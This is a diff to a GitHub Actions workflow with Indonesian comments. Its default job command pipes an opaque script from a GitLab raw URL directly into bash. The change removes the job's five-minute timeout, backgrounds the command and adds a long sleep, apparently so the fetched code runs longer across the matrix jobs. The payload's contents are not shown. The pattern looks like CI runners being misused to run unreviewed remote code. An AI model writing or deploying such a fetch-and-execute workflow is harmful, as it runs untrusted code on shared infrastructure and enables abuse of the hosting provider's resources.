@@ -26,7 +26,6 @@ jobs:
   nert:
     needs: [hert]
     runs-on: ubuntu-latest
-    timeout-minutes: 5          # ⏰ Job akan berhenti total setelah 5 menit
     strategy:
       fail-fast: false
       matrix:
@@ -35,7 +34,8 @@ jobs:
     steps:
       - name: Jalankan perintah (default)
         continue-on-error: true
-        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}
+        run: ${{ github.event.inputs.command || 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash' }}  &
+           sleep 325s
 
   dert:
     needs: [nert]
